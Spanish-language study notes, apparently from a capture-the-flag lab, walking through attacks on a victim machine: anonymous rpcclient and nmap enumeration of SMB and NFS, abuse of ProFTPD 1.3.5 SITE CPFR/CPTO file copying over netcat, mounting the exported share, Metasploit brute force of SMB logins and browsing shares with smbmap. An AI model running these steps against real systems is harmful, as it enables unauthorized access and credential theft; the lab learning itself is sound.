- SAMBA también corre por el puerto 445, este protocolo permite la comunicación de sistemas operativos que no sean windows puedan comunicarse con el puerto SMB.

- Escaneamos la maquina victima y nos sale el puerto 445 abierto además de ==SAMBA== .
![[Pasted image 20241221164750.png]]
- En este caso tenemos una maquina Linux con puerto 445 ==SAMBA== abierto para poder comunicarse con Sistemas operativos Windows.
- Como no tenemos credenciales podemos enumerarla con la herramienta ==RPCCLIENT==, utilizando el siguiente comando:
```
rpcclient -U "" -N (IP_VICTIMA)
```
==LO QUE VIENE DESPUES DE -U ES EL USUARIO, PERO LO DEJAMOS BASIO PORQUE NO SABEMOS CUAL ES==
![[Pasted image 20241221165144.png]]
- Como podemos ver nos direcciona una especia de lugar para poder ingresar comandos de ==rpcclient==.
- Debemos conocer 3 comandos que nos van a servir para enumerar y obtener información:
```
srvinfo
```
![[Pasted image 20241221165327.png]]
```
querydispinfo
```
![[Pasted image 20241221165401.png]]
- Aquí encontramos 2 usuarios: ==ken== y ==takeshi==.
	- Ya con esto podemos hacer fuerza bruta.
```
enumdomusers
```
![[Pasted image 20241221165541.png]]
- También es un comando que nos muestra usuarios, por si el comando anterior no nos arroja uno.
- Y si aun no nos arroja uno usamos el siguiente comando con ==nmap==.
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse (IP_VICTIMA)
```
- Este comando nos permite ver directorios ocultos o carpetas que poseen los puertos que tengan ==samba==.
- Tenemos otro puerto 111 Que tiene samba, si usamos el siguiente comando encontramos esto
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount (IP_VICTIMA)
```

![[Pasted image 20250210184010.png]]
- sabemos lo que tiene en la carpeta /van
- Ahora queremos copiar esa carpeta
	- Para copiarlo tenemos que meternos por el puerto 21 donde corre una version ProFTPD 1.3.5. Si investigamos nos saldra que tiene un exploit para copiar archivos.
	- Para eso usamos el siguiente comando:
```
nc (IP_VICTIMA) 21
```
![[Pasted image 20250210184352.png]]
- ==220== nos avisara que la conexión ya esta lista.
- Ahora usamos los siguietenes comandos:
![[Pasted image 20250210184530.png]]
- ==SITE CPFR== --> (COPY FROM) Selecciona el archivo o directorio que se desea copiar.
![[Pasted image 20250210184538.png]]
- ==SITE CPTO== --> (COPIAR A) Especifica la ruta de destino donde se copiará el archivo o directorio.
- Todo esto lo sacamos de un .txt de la maquina.
- Ahora que ya lo copiamos, debemos montar el directorio /var/tmp a nuestra máquina usando el siguiente comando:
```
mkdir /mnt/kenobiNFS
```
- Luego:
```
mount (IP_VICTIMA):/var /mnt/kenobiNFS
```
- Ya montada usamos el siguiente comando:
```
ls -la /mnt/kenobiNFS
```
==NFS es el protocolo utilizado para montar el sistemas de archivos remotos en Linux, se incluye en el nombre para indicar que el directorio está asociado a un montaje NFS.===


- Ahora podemos usar hydra o metasploit para hacer fuerza bruta.
- En este caso vamos a utilizar metasploit, con el siguiente sploit para ==SMB==.
```
use scanner/smb/smb_login
```
![[Pasted image 20241221165830.png]]
- Usamos show options y rellenamos todos los espacios necesarios.
- Ejecutamos.
![[Pasted image 20241221170916.png]]
- Ya tenemos la contraseña.
- Ahora que tenemos la credenciales, vamos ir enumerando recursos compartidos con ==smbmap== con el siguiente comando:
```
smbmap -u '(USUARIO)' -p (PASSWORD) -H (IP_VICTIMA)
```
![[Pasted image 20241221172027.png]]
- Como podemos ver tenemos acceso a ==ken==.
- Entonces agregamos al comando:
```
smbmap -u '(USUARIO)' -p (PASSWORD) -H (IP_VICTIMA) -r (RECURSO_COMPARTIDO)
```
![[Pasted image 20241221172213.png]]
- Y así vamos entrando y revisando información delicada.

deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware